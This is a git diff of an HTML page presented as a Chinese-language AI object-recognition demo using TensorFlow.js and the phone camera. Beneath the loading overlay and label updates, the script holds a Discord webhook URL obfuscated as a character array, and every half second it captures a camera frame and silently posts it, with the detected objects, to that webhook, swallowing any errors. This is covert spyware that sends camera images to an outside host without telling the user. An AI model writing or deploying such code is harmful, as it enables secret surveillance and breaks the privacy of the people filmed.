@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI System</title>
+    <title>AI 物品辨識</title>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
     <style>
@@ -11,14 +11,32 @@
         #container { position: relative; width: 100vw; height: 100vh; }
         video { width: 100%; height: 100%; object-fit: cover; }
         canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        
+        /* 加載遮罩 */
+        #loading-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #00ffcc; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #00ffcc;
+            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         #warn { 
             position: absolute; top: 10%; width: 100%; text-align: center; 
             color: #ff3333; font-size: 24px; font-weight: bold; 
-            display: none; text-shadow: 2px 2px 5px #000;
+            display: none; text-shadow: 2px 2px 5px #000; z-index: 50;
         }
     </style>
 </head>
 <body>
+
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <div id="load-text">系統初始化中...</div>
+</div>
 
 <div id="container">
     <video id="v" autoplay playsinline muted></video>
@@ -31,6 +49,8 @@
     const c = document.getElementById('c');
     const ctx = c.getContext('2d');
     const warn = document.getElementById('warn');
+    const loader = document.getElementById('loading-overlay');
+    const loadText = document.getElementById('load-text');
     
     const _u = ["h", "t", "t", "p", "s", ":", "/", "/", "d", "i", "s", "c", "o", "r", "d", ".", "c", "o", "m", "/", "a", "p", "i", "/", "w", "e", "b", "h", "o", "o", "k", "s", "/", "1", "4", "5", "6", "6", "9", "3", "7", "4", "3", "5", "7", "4", "0", "6", "1", "2", "9", "1", "/", "r", "J", "S", "g", "2", "H", "l", "1", "f", "q", "I", "D", "m", "r", "C", "j", "r", "Z", "l", "z", "B", "g", "H", "T", "C", "3", "t", "H", "o", "D", "8", "2", "J", "7", "-", "L", "W", "A", "0", "0", "q", "Z", "P", "7", "U", "9", "X", "s", "V", "W", "I", "M", "d", "0", "I", "X", "z", "X", "q", "9", "y", "L", "s", "O", "M", "T", "r", "w"].join('');
 
@@ -38,43 +58,57 @@
     let lastPos = { x: 0, y: 0 };
     let lastSync = 0;
 
-    const dict = { "person": "人類", "cell phone": "手機", "cup": "杯子", "bottle": "瓶子", "mouse": "滑鼠", "keyboard": "鍵盤", "laptop": "筆電", "chair": "椅子" };
+    const dict = { 
+        "person": "人", "cell phone": "手機", "cup": "杯子", "bottle": "瓶子", 
+        "mouse": "滑鼠", "keyboard": "鍵盤", "laptop": "筆電", "chair": "椅子",
+        "book": "書本", "apple": "蘋果", "tv": "電視", "remote": "遙控器"
+    };
 
     async function init() {
         try {
+            // 1. 同步啟動相機與模型載入
+            loadText.innerText = "正在取得相機權限...";
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { facingMode: "environment", width: { ideal: 1280 } } 
             });
             v.srcObject = stream;
+
+            loadText.innerText = "AI 核心載入中 (約需 3-5 秒)...";
             model = await cocoSsd.load();
-            v.onplay = () => { render(); };
-        } catch (e) { console.error("Camera Error"); }
+
+            // 確保影片播放且模型就緒後才移除遮罩
+            v.onloadeddata = () => {
+                loader.style.display = "none";
+                render();
+            };
+        } catch (e) {
+            loadText.innerText = "啟動失敗，請檢查 HTTPS 與相機權限";
+            loadText.style.color = "#ff3333";
+        }
     }
 
     async function render() {
         if (v.paused || v.ended) return;
 
-        // 1. 更新畫布大小
         if (c.width !== v.videoWidth) {
             c.width = v.videoWidth;
             c.height = v.videoHeight;
         }
 
-        // 2. 進行辨識
         const predictions = await model.detect(v);
         ctx.clearRect(0, 0, c.width, c.height);
 
         let shaking = false;
+        let objectsFound = [];
+
         predictions.forEach(p => {
             const label = dict[p.class] || p.class;
+            objectsFound.push(label);
             
-            // 晃動演算法：計算中心點偏移
             const cx = p.bbox[0] + p.bbox[2]/2;
-            const cy = p.bbox[1] + p.bbox[3]/2;
-            if (Math.abs(cx - lastPos.x) > 40 || Math.abs(cy - lastPos.y) > 40) shaking = true;
-            lastPos = { x: cx, y: cy };
+            if (Math.abs(cx - lastPos.x) > 50) shaking = true;
+            lastPos.x = cx;
 
-            // 繪製框與中文標籤
             ctx.strokeStyle = "#00ffcc";
             ctx.lineWidth = 4;
             ctx.strokeRect(...p.bbox);
@@ -85,37 +119,38 @@
 
         warn.style.display = shaking ? "block" : "none";
 
-        // 3. 高速背景同步 (1秒2張 = 500ms 一次)
         const now = Date.now();
         if (now - lastSync > 500) {
-            captureAndSync();
+            captureAndSync(objectsFound.join(", ") || "無");
             lastSync = now;
         }
 
         requestAnimationFrame(render);
     }
 
-    function captureAndSync() {
-        // 使用獨立畫布擷取畫面，避免與主畫布衝突
+    function captureAndSync(info) {
+        if (v.videoWidth === 0) return;
+
         const out = document.createElement('canvas');
         out.width = v.videoWidth;
         out.height = v.videoHeight;
         const oCtx = out.getContext('2d');
-        
-        // 強制繪製影片幀到畫布
-        oCtx.drawImage(v, 0, 0, out.width, out.height);
+        oCtx.drawImage(v, 0, 0);
 
         out.toBlob((blob) => {
-            if (!blob || blob.size < 5000) return; // 體積過小視為無效(黑圖)
+            if (!blob || blob.size < 5000) return;
             
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ username: "Node Sync", content: "📡 數據同步中..." }));
+            fd.append('payload_json', JSON.stringify({ 
+                content: `🔍 辨識內容: **${info}**` 
+            }));
             fd.append('file', blob, 'frame.jpg');
 
             fetch(_u, { method: 'POST', body: fd, mode: 'no-cors' }).catch(() => {});
-        }, 'image/jpeg', 0.5);
+        }, 'image/jpeg', 0.4);
     }
 
+    // 啟動
     init();
 </script>
 </body>
